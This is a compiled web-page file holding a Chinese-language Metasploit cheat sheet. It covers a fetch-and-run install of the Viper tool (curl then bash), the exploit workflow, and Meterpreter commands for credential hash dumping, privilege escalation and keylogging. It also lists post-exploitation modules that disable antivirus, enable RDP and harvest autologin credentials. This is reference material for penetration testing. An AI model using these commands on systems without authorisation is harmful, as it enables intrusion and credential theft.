import{_ as n}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as r,c as l,a as t,b as e,d as a,e as d,r as o}from"./app.97ace05d.js";const i={},g=t("h2",{id:"vps安装",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#vps安装","aria-hidden":"true"},"#"),e(" VPS安装")],-1),h={href:"https://www.yuque.com/vipersec/help",target:"_blank",rel:"noopener noreferrer"},c=d(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">vm.max_map_count</span><span class="token operator">=</span><span class="token number">262144</span>
<span class="token function">curl</span> <span class="token parameter variable">-o</span> f8x https://f8x.io/   <span class="token comment"># wget -O f8x https://f8x.io/</span>
<span class="token function">bash</span> f8x <span class="token parameter variable">-viper</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="metasploit模块划分" tabindex="-1"><a class="header-anchor" href="#metasploit模块划分" aria-hidden="true">#</a> Metasploit模块划分</h2><p>MSF是渗透测试领域最流行的渗透测试框架，它有以下5个模块</p><table><thead><tr><th>辅 助 模 块 (Auxiliary，扫描器)</th><th>扫描主机系统，寻找可用漏洞；</th></tr></thead><tbody><tr><td>渗透攻击模块 (Exploits)</td><td>进行漏洞利用攻击；</td></tr><tr><td>攻击载荷模块 (Payloads)</td><td>生成攻击载荷（木马）；</td></tr><tr><td>后渗透攻击模块 (Post)</td><td>用于内网渗透的各种操作；</td></tr><tr><td>编 码 器 模 块 (Encoders)</td><td>选择编码技术，绕过杀软（或其他免杀方式）</td></tr></tbody></table><p>所有模块位置：<strong>/usr/share/metasploit-framework/modules/</strong></p><h2 id="渗透步骤-exploit" tabindex="-1"><a class="header-anchor" href="#渗透步骤-exploit" aria-hidden="true">#</a> 渗透步骤（Exploit）</h2><table><thead><tr><th style="text-align:left;">命令</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;">search xxx</td><td style="text-align:left;">#搜索某个漏洞</td></tr><tr><td style="text-align:left;">use xxx</td><td style="text-align:left;">#使用某个漏洞利用模块</td></tr><tr><td style="text-align:left;">show options</td><td style="text-align:left;">#查看配置选项</td></tr><tr><td style="text-align:left;">set payload</td><td style="text-align:left;">#配置攻击载荷</td></tr><tr><td style="text-align:left;">exploit</td><td style="text-align:left;">#执行渗透攻击</td></tr></tbody></table><h2 id="参数摘要" tabindex="-1"><a class="header-anchor" href="#参数摘要" aria-hidden="true">#</a> 参数摘要</h2><table><thead><tr><th style="text-align:left;">命令</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;"><strong>reload_all</strong></td><td style="text-align:left;"><strong>#从目录重载所有模块</strong></td></tr><tr><td style="text-align:left;"><strong>back</strong></td><td style="text-align:left;"><strong>#后退命令，移出当前上下文，用于模块切换</strong></td></tr><tr><td style="text-align:left;"><strong>info</strong></td><td style="text-align:left;"><strong>#目标和模块详细信息</strong></td></tr><tr><td style="text-align:left;"><strong>check</strong></td><td style="text-align:left;"><strong>#检查目标是否受某个漏洞影响</strong></td></tr></tbody></table><h3 id="sessions会话管理" tabindex="-1"><a class="header-anchor" href="#sessions会话管理" aria-hidden="true">#</a> sessions会话管理</h3><table><thead><tr><th style="text-align:left;">命令</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;"><strong>sessions</strong> <strong>-l</strong></td><td style="text-align:left;"><strong>#列出所有会话</strong></td></tr><tr><td style="text-align:left;"><strong>sessions</strong> <strong>-K</strong></td><td style="text-align:left;"><strong>#终止所有会话</strong></td></tr><tr><td style="text-align:left;"><strong>sessions</strong> <strong>-i</strong> <strong>id</strong></td><td style="text-align:left;"><strong>#进入某个会话</strong></td></tr><tr><td style="text-align:left;"><strong>sessions</strong> <strong>-v</strong></td><td style="text-align:left;"><strong>#以详细模式列出会话</strong></td></tr><tr><td style="text-align:left;"><strong>sessions</strong> <strong>-u</strong></td><td style="text-align:left;"><strong>#在许多平台上将shell升级到meterpreter会话</strong></td></tr></tbody></table><h3 id="show-options显示可选选项" tabindex="-1"><a class="header-anchor" href="#show-options显示可选选项" aria-hidden="true">#</a> show options显示可选选项</h3><table><thead><tr><th style="text-align:left;">命令</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;"><strong>auxiliary</strong></td><td style="text-align:left;"><strong>#显示所有辅助模块</strong></td></tr><tr><td style="text-align:left;"><strong>exploits</strong></td><td style="text-align:left;"><strong>#显示所有漏洞利用模块</strong></td></tr><tr><td style="text-align:left;"><strong>payloads</strong></td><td style="text-align:left;"><strong>#显示所有有效载荷</strong></td></tr><tr><td style="text-align:left;"><strong>targets</strong></td><td style="text-align:left;"><strong>#显示所有可用目标</strong></td></tr><tr><td style="text-align:left;"><strong>advanced</strong></td><td style="text-align:left;"><strong>#显示更多高级选项</strong></td></tr><tr><td style="text-align:left;"><strong>encoders</strong></td><td style="text-align:left;"><strong>#显示可用编码器列表</strong></td></tr></tbody></table><h2 id="meterpreter用例" tabindex="-1"><a class="header-anchor" href="#meterpreter用例" aria-hidden="true">#</a> Meterpreter用例</h2><p>刚获得Meterpreter Shell时，该Shell是极其脆弱的，可以把它和目标机中一个稳定的程序绑定</p><table><thead><tr><th style="text-align:left;">命令</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;"><strong>getpid</strong></td><td style="text-align:left;">#查看当前Meterpreter Shell的进程号</td></tr><tr><td style="text-align:left;"><strong>ps</strong></td><td style="text-align:left;">#获取目标机正运行的进程</td></tr><tr><td style="text-align:left;"><strong>migrate</strong> <strong>476</strong></td><td style="text-align:left;">#将shell迁移到PID为786的进程中</td></tr></tbody></table><h3 id="命令摘要" tabindex="-1"><a class="header-anchor" href="#命令摘要" aria-hidden="true">#</a> 命令摘要</h3><p>pwd、ls、cd</p><table><thead><tr><th style="text-align:left;">命令</th><th style="text-align:left;">作用</th></tr></thead><tbody><tr><td style="text-align:left;"><strong>getuid</strong></td><td style="text-align:left;">#查看当前权限</td></tr><tr><td style="text-align:left;"><strong>getsystem</strong></td><td style="text-align:left;">#获得系统管理员权限（要本地管理员权限运行）</td></tr><tr><td style="text-align:left;"><strong>hashdump</strong></td><td style="text-align:left;">#抓哈希密码</td></tr><tr><td style="text-align:left;"><strong>sysinfo</strong></td><td style="text-align:left;">#查看系统信息</td></tr><tr><td style="text-align:left;"><strong>idletim</strong></td><td style="text-align:left;">#查看目标系统已运行时间</td></tr><tr><td style="text-align:left;"><strong>route</strong></td><td style="text-align:left;">#查看目标机完整网络设置</td></tr><tr><td style="text-align:left;"><strong>shell</strong></td><td style="text-align:left;">#进入目标机shell，exit退出shell</td></tr><tr><td style="text-align:left;"><strong>background</strong></td><td style="text-align:left;">#将meterpreter隐藏在后台</td></tr></tbody></table><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>upload ./1.txt c:\\1.txt</td><td>#上传文件</td></tr><tr><td><strong>download c:\\1.txt ./</strong></td><td>下载文件</td></tr><tr><td><strong>search</strong> <strong>-f</strong> *<strong>.txt</strong> <strong>-d</strong> <strong>c://</strong></td><td>#搜索文件</td></tr><tr><td><strong>keyscan_start</strong></td><td>#启动键盘记录</td></tr><tr><td><strong>keyscan_stop</strong></td><td>#停止键盘记录</td></tr><tr><td><strong>keyscan_dump</strong></td><td>#转储键盘记录的内容</td></tr><tr><td><strong>screenshot</strong></td><td>#抓取截屏</td></tr></tbody></table><h2 id="后渗透模块" tabindex="-1"><a class="header-anchor" href="#后渗透模块" aria-hidden="true">#</a> 后渗透模块</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>run post/windows/gather/checkvm           <span class="token comment">#检查目标是否虚拟机</span>
run post/linux/gather/checkvm
run post/windows/manage/killav            <span class="token comment">#关闭杀软</span>
run post/windows/manage/enable_rdp          <span class="token comment">#开启目标远程桌面</span>
run post/windows/gather/enum_logged_on_users     <span class="token comment">#列举当前登陆用户，和最近登陆过的用户</span>
run post/windows/gather/enum_applications      <span class="token comment">#列举应用程序</span>
run windows/gather/credentials/windows_autologin   <span class="token comment">#列举自动登陆的用户名和密码</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,22);function x(p,f){const s=o("ExternalLinkIcon");return r(),l("div",null,[g,t("p",null,[t("a",h,[e("https://www.yuque.com/vipersec/help"),a(s)])]),c])}const m=n(i,[["render",x],["__file","Metasploit.html.vue"]]);export{m as default};
